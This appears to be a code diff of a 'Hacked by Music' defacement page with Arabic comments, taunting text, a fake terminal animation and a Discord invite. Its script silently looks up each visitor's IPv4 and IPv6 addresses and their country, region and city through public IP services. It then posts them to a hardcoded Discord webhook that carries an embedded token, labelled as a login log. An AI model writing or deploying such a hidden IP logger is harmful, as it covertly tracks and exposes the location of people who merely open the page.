@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Music Suite</title>
+    <title>Music Suite - Secure Terminal</title>
     <style>
         body {
             margin: 0;
@@ -37,12 +37,8 @@
         }
 
         @keyframes flash {
-            0% {
-                opacity: 0.2;
-            }
-            100% {
-                opacity: 0;
-            }
+            0% { opacity: 0.2; }
+            100% { opacity: 0; }
         }
 
         /* فيديو الخلفية المحسن مع التكرار التلقائي */
@@ -101,33 +97,24 @@
         }
 
         @keyframes loading {
-            0% {
-                width: 0%;
-            }
-            40% {
-                width: 60%;
-            }
-            75% {
-                width: 90%;
-            }
-            100% {
-                width: 100%;
-            }
+            0% { width: 0%; }
+            40% { width: 60%; }
+            75% { width: 90%; }
+            100% { width: 100%; }
         }
 
         /* العناوين والخطوط الرقمية */
         .main-title {
             font-size: 3.5em;
             color: #fff;
-            margin: 20px 0;
+            margin: 15px 0;
             text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
             letter-spacing: 10px;
             animation: pulse-white 3s ease-in-out infinite;
         }
 
         @keyframes pulse-white {
-            0%,
-            100% {
+            0%, 100% {
                 text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
                 transform: scale(1);
             }
@@ -140,37 +127,9 @@
         .subtitle {
             font-size: 2em;
             color: #ccc;
-            margin: 20px 0;
+            margin: 15px 0;
             text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
             letter-spacing: 3px;
-        }
-
-        /* روابط الديسكورد المطلية بوهج ذهبي */
-        .discord-link {
-            font-size: 1.6em;
-            color: #ffd700;
-            margin-top: 40px;
-            text-shadow: 0 0 10px #ffd700, 0 0 25px #ffec3d;
-            letter-spacing: 2px;
-            font-family: 'Courier New', monospace;
-            animation: glow-gold 3s ease-in-out infinite alternate;
-            text-decoration: none;
-            transition: all 0.3s ease;
-        }
-
-        .discord-link:hover {
-            color: #fff59d;
-            text-shadow: 0 0 15px #fff59d, 0 0 35px #fff59d;
-            transform: scale(1.06);
-        }
-
-        @keyframes glow-gold {
-            from {
-                text-shadow: 0 0 10px #ffd700, 0 0 20px #ffd700;
-            }
-            to {
-                text-shadow: 0 0 20px #fffacd, 0 0 40px #fffacd;
-            }
         }
 
         /* حاوية المحتوى الرئيسي */
@@ -184,13 +143,75 @@
         }
 
         .logo-image {
-            width: 210px;
+            width: 180px;
             height: auto;
-            margin-bottom: 25px;
+            margin-bottom: 15px;
             border-radius: 16px;
             box-shadow: 0 0 35px rgba(255, 255, 255, 0.25);
             animation: pulse-white 3s ease-in-out infinite;
             border: 2px solid rgba(255, 255, 255, 0.15);
+        }
+
+        /* ========================================================
+           [شاشة الـ CMD السوداء الصافية]
+           ======================================================== */
+        .cmd-window {
+            width: 650px;
+            background-color: #0c0c0c;
+            border: 1px solid rgba(255, 51, 51, 0.35);
+            box-shadow: 0 0 30px rgba(255, 51, 51, 0.2);
+            border-radius: 6px;
+            overflow: hidden;
+            margin-top: 20px;
+            direction: ltr;
+            text-align: left;
+            font-family: 'Consolas', 'Lucida Console', 'Courier New', monospace;
+        }
+
+        .cmd-body {
+            padding: 20px;
+            height: 180px;
+            overflow-y: auto;
+            font-size: 0.9em;
+            color: #00ff66;
+            line-height: 1.5;
+            background: #0c0c0c;
+        }
+
+        .prompt-symbol {
+            color: #61afef;
+            margin-right: 6px;
+            font-weight: bold;
+        }
+
+        .discord-highlight {
+            color: #ffd700;
+            text-decoration: none;
+            font-weight: bold;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.7);
+            border-bottom: 1px dashed #ffd700;
+            transition: all 0.2s ease;
+        }
+
+        .discord-highlight:hover {
+            color: #fff;
+            background: rgba(255, 215, 0, 0.2);
+            text-shadow: 0 0 15px #ffd700;
+        }
+
+        .cursor {
+            display: inline-block;
+            width: 8px;
+            height: 15px;
+            background-color: #00ff66;
+            animation: blink-cursor 0.8s infinite steps(1);
+            vertical-align: -2px;
+            margin-left: 2px;
+        }
+
+        @keyframes blink-cursor {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
         }
 
         /* نظام الجسيمات الخفيف والسلس */
@@ -214,41 +235,24 @@
         }
 
         @keyframes float {
-            0% {
-                transform: translateY(100vh);
-                opacity: 1;
-            }
-            100% {
-                transform: translateY(-10px);
-                opacity: 0;
-            }
+            0% { transform: translateY(100vh); opacity: 1; }
+            100% { transform: translateY(-10px); opacity: 0; }
         }
 
         .fade-out {
             animation: fadeOut 0.8s ease forwards;
         }
         @keyframes fadeOut {
-            from {
-                opacity: 1;
-            }
-            to {
-                opacity: 0;
-                visibility: hidden;
-            }
+            from { opacity: 1; }
+            to { opacity: 0; visibility: hidden; }
         }
 
         .fade-in {
             animation: fadeIn 1.2s ease forwards;
         }
         @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         /* حاوية بيانات المستخدم العلوية المحدثة */
@@ -271,7 +275,6 @@
             min-width: 160px;
         }
 
-        /* تنسيق الساعة الرقمية المضيئة */
         #clock {
             font-size: 1.5em;
             color: #00ff00;
@@ -280,7 +283,6 @@
             text-shadow: 0 0 12px rgba(0, 255, 0, 0.8);
         }
 
-        /* سطر عرض بيانات الاتصال والموقع الجغرافي (تم إضافة الـ id المطلوب) */
         .status-text-block {
             font-size: 0.85em;
             color: #aaffaa;
@@ -295,7 +297,6 @@
             line-height: 1.6;
         }
 
-        /* شريط معلومات النظام التفاعلي أسفل الشاشة */
         .bottom-logs {
             position: fixed;
             bottom: 20px;
@@ -312,45 +313,11 @@
             border-radius: 4px;
             border: 1px solid rgba(255, 51, 51, 0.15);
         }
-
-        /* مؤشر حالة النظام العام أسفل اليمين */
-        .system-status {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            font-size: 1em;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-            z-index: 1000;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            text-shadow: 0 0 6px #00ff00;
-        }
-
-        .status-dot {
-            width: 10px;
-            height: 10px;
-            background-color: #00ff00;
-            border-radius: 50%;
-            box-shadow: 0 0 10px #00ff00;
-            animation: blink 1.2s infinite alternate;
-        }
-
-        @keyframes blink {
-            from {
-                opacity: 1;
-            }
-            to {
-                opacity: 0.25;
-            }
-        }
     </style>
 </head>
 
 <body>
 
-    <!-- شريط الحالة العلوي (تم إضافة العنصر المطلوب هنا) -->
     <div class="top-left-status">
         <div id="clock">00:00:00 AM</div>
         <div id="top-ip-display" class="status-text-block">
@@ -361,15 +328,12 @@
         </div>
     </div>
 
-    <!-- شريط السجلات السفلي -->
     <div class="bottom-logs" id="terminal-logs">[SYS] STATUS: STANDBY_MODE...</div>
 
-    <!-- فيديو الخلفية -->
     <video class="background-video" autoplay loop muted playsinline id="bg-video">
         <source src="https://h.top4top.io/m_37898tcsh1.mp4" type="video/mp4" />
     </video>
 
-    <!-- ملفات الصوت -->
     <audio id="background-music" loop playsinline>
         <source src="https://d.top4top.io/m_3789i6ns81.mp3" type="audio/mpeg" />
     </audio>
@@ -381,7 +345,6 @@
     <div class="overlay"></div>
     <div class="particles" id="particles"></div>
 
-    <!-- شاشة التحميل -->
     <div class="loading-screen" id="loading-screen">
         <div class="main-title">Music</div>
         <div class="loading-bar-container">
@@ -389,28 +352,26 @@
         </div>
         <div class="subtitle">Hacked by Music</div>
         <div class="subtitle">! You are Idiot !</div>
-        <a href="" class="discord-link" target="_blank" rel="noopener noreferrer"></a>
     </div>
 
-    <!-- المحتوى الرئيسي -->
     <div class="main-content" id="main-content">
         <img src="https://j.top4top.io/p_3664n97sh1.jpg" alt="Logo" class="logo-image" />
-        <div class="main-title">Music on your server</div>
-        <div class="main-title">! You are Idiot !</div>
-        <div class="subtitle">
-            <br>
+        <div class="main-title" style="font-size: 2.2em; margin: 5px 0;">Music on your server</div>
+        <div class="main-title" style="font-size: 2em; margin: 5px 0; color: #ff3333;">! You are Idiot !</div>
+        
+        <div class="cmd-window">
+            <div class="cmd-body" id="cmd-body">
+                <br><br>
+                <span class="prompt-symbol">C:\Users\Music&gt;</span><span id="line-1"></span><br>
+                <span class="prompt-symbol" id="sym-2" style="display:none">C:\Users\Music&gt;</span><span id="line-2"></span><br>
+                <span class="prompt-symbol" id="sym-3" style="display:none">C:\Users\Music&gt;</span><span id="line-3"></span><span class="cursor" id="cursor-active"></span>
+            </div>
         </div>
-        <a href="" class="discord-link" target="_blank" rel="noopener noreferrer"></a>
     </div>
 
     <script>
-        // ================================================================
-        //  [التحسينات] الجزء الأول: دوال جلب IPv4 و IPv6 مع مهلة زمنية
-        // ================================================================
-
         let currentNetworkData = {};
 
-        // دالة مساعدة لإضافة مهلة زمنية للـ Fetch (إلغاء الطلب بعد 4 ثواني)
         function fetchWithTimeout(url, timeout = 4000) {
             const controller = new AbortController();
             const timeoutId = setTimeout(() => controller.abort(), timeout);
@@ -430,53 +391,39 @@
                 });
         }
 
-        // جلب عنوان IP حسب الإصدار (v4 أو v6)
         async function fetchIPVersion(version) {
             const urls = {
-                v4: [
-                    'https://api.ipify.org?format=json',
-                    'https://ipv4.icanhazip.com/' // يعيد نصاً، لكن سنتعامل معه كـ fallback
-                ],
-                v6: [
-                    'https://api6.ipify.org?format=json',
-                    'https://ipv6.icanhazip.com/'
-                ]
+                v4: ['https://api.ipify.org?format=json', 'https://ipv4.icanhazip.com/'],
+                v6: ['https://api6.ipify.org?format=json', 'https://ipv6.icanhazip.com/']
             };
 
             const list = urls[version] || urls.v4;
-            // حاول استخدام api.ipify.org أولاً (JSON)، ثم النصية كـ fallback
             for (const url of list) {
                 try {
                     const resp = await fetchWithTimeout(url, 3000);
-                    // إذا كانت الاستجابة نصية (من icanhazip) نحولها لكائن
                     if (typeof resp === 'string') {
                         const ip = resp.trim();
                         if (ip) return { ip };
                     }
-                    // إذا كانت JSON
                     if (resp && resp.ip) {
                         return { ip: resp.ip };
                     }
-                } catch (_) { /* تجاهل الخطأ وجرب التالي */ }
+                } catch (_) {}
             }
-            return null; // فشل جلب هذا الإصدار
+            return null;
         }
 
-        // الدالة الرئيسية لجلب بيانات الشبكة (IPv4 و IPv6 + الموقع الجغرافي)
         async function fetchOptimizedNetworkData() {
-            // 1. التحقق من الكاش أولاً (صلاحية ساعة واحدة)
             try {
                 const cached = localStorage.getItem('user_geo_cache');
                 if (cached) {
                     const parsed = JSON.parse(cached);
                     if (Date.now() - parsed.timestamp < 3600000) {
-                        console.log('✅ استخدام بيانات مخزنة مؤقتاً');
                         return parsed.data;
                     }
                 }
-            } catch (e) { /* تجاهل خطأ الكاش */ }
+            } catch (e) {}
 
-            // 2. جلب كلا الإصدارين بشكل متوازٍ
             const [v4Result, v6Result] = await Promise.allSettled([
                 fetchIPVersion('v4'),
                 fetchIPVersion('v6')
@@ -484,11 +431,8 @@
 
             const ipv4 = v4Result.status === 'fulfilled' && v4Result.value ? v4Result.value.ip : 'غير متاح';
             const ipv6 = v6Result.status === 'fulfilled' && v6Result.value ? v6Result.value.ip : 'غير متاح';
-
-            // 3. جلب البيانات الجغرافية (باستخدام الخدمة الأسرع)
             const geoData = await fetchGeoLocation();
 
-            // 4. دمج النتائج
             const result = {
                 ipv4,
                 ipv6,
@@ -498,17 +442,14 @@
                 isp: geoData?.isp || 'غير معروف'
             };
 
-            // حفظ في الكاش مع الطابع الزمني
             localStorage.setItem('user_geo_cache', JSON.stringify({
                 data: result,
                 timestamp: Date.now()
             }));
 
-            console.log('✅ تم جلب البيانات بنجاح:', result);
             return result;
         }
 
-        // جلب الموقع الجغرافي من عدة خدمات (نفس الكود الأصلي مع تعديل بسيط)
         async function fetchGeoLocation() {
             const API_SOURCES = [{
                 url: 'https://ipapi.co/json/',
@@ -526,49 +467,29 @@
                     city: data.city || 'غير معروف',
                     isp: data.connection?.isp || data.org || 'غير معروف'
                 })
-            }, {
-                url: 'https://extreme-ip-lookup.com/json/',
-                parser: (data) => ({
-                    country: data.country || 'غير معروف',
-                    region: data.region || 'غير معروف',
-                    city: data.city || 'غير معروف',
-                    isp: data.org || data.isp || 'غير معروف'
-                })
             }];
 
             const fetchPromises = API_SOURCES.map(source =>
-                fetchWithTimeout(source.url, 3000)
-                .then(data => {
-                    if (!data || (!data.ip && !data.query && !data.country)) {
-                        throw new Error('بيانات غير مكتملة');
-                    }
-                    return source.parser(data);
-                })
+                fetchWithTimeout(source.url, 3000).then(data => source.parser(data))
             );
 
             try {
-                const result = await Promise.any(fetchPromises);
-                return result;
+                return await Promise.any(fetchPromises);
             } catch (error) {
-                console.error('❌ فشلت جميع خدمات جلب الموقع:', error);
                 return null;
             }
         }
-
-        // ================================================================
-        //  [التحسينات] الجزء الثاني: تحديث الواجهة وإرسال Webhook
-        // ================================================================
 
         function updateLocationUI(data) {
             const displayElement = document.getElementById('top-ip-display');
             if (displayElement) {
                 displayElement.innerHTML = `
-                        الدولة: ${data.country}<br>
-                        المنطقة: ${data.region}<br>
-                        المدينة: ${data.city}<br>
-                        IPv4: ${data.ipv4}<br>
-                        IPv6: ${data.ipv6}
-                    `;
+                    الدولة: ${data.country}<br>
+                    المنطقة: ${data.region}<br>
+                    المدينة: ${data.city}<br>
+                    IPv4: ${data.ipv4}<br>
+                    IPv6: ${data.ipv6}
+                `;
             }
         }
 
@@ -576,23 +497,21 @@
             const displayElement = document.getElementById('top-ip-display');
             if (displayElement) {
                 displayElement.innerHTML = `
-                        الدولة: فحص الشبكة...<br>
-                        المنطقة: جاري التثبيت...<br>
-                        المدينة: فحص الاتصال...<br>
-                        IPv4: جاري التحميل...<br>
-                        IPv6: جاري التحميل...
-                    `;
+                    الدولة: فحص الشبكة...<br>
+                    المنطقة: جاري التثبيت...<br>
+                    المدينة: فحص الاتصال...<br>
+                    IPv4: جاري التحميل...<br>
+                    IPv6: جاري التحميل...
+                `;
             }
         }
 
-        // دالة إرسال البيانات إلى Webhook (مع IPv4 و IPv6)
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1522122255327297667/2Sh-s4h-GgR_BaM8eexpMzzrO_7XimZavKHcbXMPDoPbhxIV5_yF020WA3AbTssRuXR8';
 
         function sendToWebhook(data) {
             if (!WEBHOOK_URL) return;
             const payload = {
                 username: "System Logger",
-                avatar_url: "",
                 embeds: [{
                     title: "🌐 تسجيل دخول مستخدم جديد (IPv4 & IPv6)",
                     color: 15548997,
@@ -601,11 +520,8 @@
                         { name: "📌 IPv6 Address", value: `\`${data.ipv6 || "غير متاح"}\``, inline: false },
                         { name: "🏳️ Country", value: data.country || "غير معروف", inline: true },
                         { name: "📍 Region", value: data.region || "غير معروف", inline: true },
-                        { name: "🏙️ City", value: data.city || "غير معروف", inline: true },
-                        { name: "🏢 ISP / Provider", value: data.isp || "غير معروف", inline: false },
-                        { name: "🖥️ User Agent", value: navigator.userAgent, inline: false }
+                        { name: "🏙️ City", value: data.city || "غير معروف", inline: true }
                     ],
-                    footer: { text: "Music System | " + new Date().toLocaleString('ar-EG') },
                     timestamp: new Date().toISOString()
                 }]
             };
@@ -614,16 +530,11 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
-            }).catch(err => console.log('خطأ ويب هوك.', err));
+            }).catch(() => {});
         }
-
-        // ================================================================
-        //  [التحسينات] الجزء الثالث: استدعاء الدالة الرئيسية
-        // ================================================================
 
         async function fetchSystemNetworkData() {
             const data = await fetchOptimizedNetworkData();
-
             if (data && data.ipv4) {
                 currentNetworkData = data;
                 updateLocationUI(data);
@@ -633,11 +544,7 @@
             }
         }
 
-        // ================================================================
-        //  باقي الكود الأصلي (الجسيمات، الساعة، السجلات، التحكم بالصوت، إلخ)
-        // ================================================================
-
-        // توليد حركة الجسيمات في الخلفية
+        // الجسيمات
         function createParticles() {
             const particles = document.getElementById('particles');
             if (!particles) return;
@@ -672,40 +579,34 @@
         };
 
         const activateInterface = () => {
-            if (glitchSound) { glitchSound.volume = 0.4;
-                glitchSound.play().catch(() => {}); }
+            if (glitchSound) { glitchSound.volume = 0.4; glitchSound.play().catch(() => {}); }
             playMedia();
         };
 
         addEventListener('click', activateInterface, { once: true });
         addEventListener('keydown', activateInterface, { once: true });
 
-        // تحديث الساعة الرقمية
+        // الساعة الرقمية
         function updateClock() {
             const now = new Date();
             let hours = now.getHours();
             const minutes = String(now.getMinutes()).padStart(2, '0');
             const seconds = String(now.getSeconds()).padStart(2, '0');
             const ampm = hours >= 12 ? 'PM' : 'AM';
-
-            hours = hours % 12;
-            hours = hours ? hours : 12;
-            const formattedHours = String(hours).padStart(2, '0');
-
+            hours = hours % 12 || 12;
             const clockElement = document.getElementById('clock');
             if (clockElement) {
-                clockElement.textContent = `${formattedHours}:${minutes}:${seconds} ${ampm}`;
+                clockElement.textContent = `${String(hours).padStart(2, '0')}:${minutes}:${seconds} ${ampm}`;
             }
         }
         setInterval(updateClock, 1000);
         updateClock();
 
-        // محاكاة سجلات فحص النظام التفاعلية
+        // السجلات السفلية
         const logsSequence = [
             "[SYS] STATUS: INITIALIZING SYSLOG...",
             "[NET] VERIFYING CONNECTION INTEGRITY...",
             "[SEC] CHECKING ENVIRONMENT NODE_7...",
-            "[SYS] PRIVILEGES IDENTIFIED...",
             "[OK] PIPELINE SYNCED WITH TERMINAL."
         ];
         let logIndex = 0;
@@ -717,7 +618,38 @@
             }
         }, 3500);
 
-        // التحكم في توقيت انتهاء شاشة التحميل والانتقال للمحتوى الأساسي
+        // تأثير الكتابة الآلية داخل الـ CMD
+        function typeWriter(text, elementId, speed, callback) {
+            let i = 0;
+            function type() {
+                if (i < text.length) {
+                    document.getElementById(elementId).innerHTML += text.charAt(i);
+                    i++;
+                    setTimeout(type, speed);
+                } else if (callback) {
+                    callback();
+                }
+            }
+            type();
+        }
+
+        function runCmdSequence() {
+            const cmdText1 = "connect_server --secure";
+            const cmdText2 = "joining community room...";
+            const cmdText3 = 'discord: <a href="https://discord.gg/M9L" class="discord-highlight" target="_blank">discord.gg/M9L</a>';
+
+            typeWriter(cmdText1, "line-1", 35, () => {
+                document.getElementById("sym-2").style.display = "inline";
+                setTimeout(() => {
+                    typeWriter(cmdText2, "line-2", 30, () => {
+                        document.getElementById("sym-3").style.display = "inline";
+                        document.getElementById("line-3").innerHTML = cmdText3;
+                    }, 250);
+                }, 250);
+            });
+        }
+
+        // توقيت الانتقال من شاشة التحميل للمحتوى الرئيسي
         const loadingBar = document.querySelector('.loading-bar');
         if (loadingBar) {
             loadingBar.addEventListener('animationend', () => {
@@ -730,12 +662,12 @@
                         mainContent.style.display = 'flex';
                         mainContent.classList.add('fade-in');
                         playMedia();
+                        runCmdSequence();
                     }, { once: true });
                 }
             });
         }
 
-        // بدء التشغيل التلقائي للفحص (باستخدام الدالة المحسّنة)
         fetchSystemNetworkData();
     </script>
 
